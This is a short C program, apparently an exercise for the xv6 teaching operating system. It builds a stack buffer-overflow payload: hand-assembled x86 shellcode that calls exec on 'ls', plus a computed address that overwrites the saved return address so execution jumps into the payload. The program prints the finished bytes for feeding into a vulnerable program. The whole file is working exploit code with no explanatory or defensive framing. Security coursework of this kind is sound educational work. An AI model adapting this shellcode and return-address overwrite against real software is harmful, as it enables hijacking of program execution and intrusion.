#include "types.h"
#include "user.h"

#define STACK_FRAME_LENGTH 52

// Payload placement.
#define OFFSET STACK_FRAME_LENGTH

#define BUFF_ADDR 0x2f8c
#define PAYLOAD_START (BUFF_ADDR + OFFSET)
#define PAYLOAD_ENTRY (PAYLOAD_START + 11)

int
main(void)
{
  uchar buf[] = {
    // Data

    [OFFSET] = 'l', 's', 0, // path
    0, 0, 0, 0,             // *argv
    0, 0, 0, 0,             // argv = 0 (empty)

    // Code

    0xb8,                   // movl ..., %eax
    0, 0, 0, 0,             // **argv
    0x50,                   // pushl %eax
    0xb8,                   // movl ..., %eax
    0, 0, 0, 0,             // *path
    0x50,                   // pushl %eax
    0x50,                   // pushl again, gets popped on int...
    0xb8,                   // movl ..., %eax
    7, 0, 0, 0,             // 7 = exec
    0xcd,                   // int
    0x40,                   // syscall
    0xeb,                   // jmp relative
    0xfe                    // -1 (infinite loop)
  };

  // Fill in addresses.
  *((int*)(buf + OFFSET + 3)) = PAYLOAD_START + 7;
  *((int*)(buf + OFFSET + 12)) = PAYLOAD_START + 3;
  *((int*)(buf + OFFSET + 18)) = PAYLOAD_START;

  // Overwrite return address to 'return' to our payload.
  *(int*)(buf + STACK_FRAME_LENGTH - 4) = PAYLOAD_ENTRY;

  write(1, buf, sizeof(buf));

  exit();
}
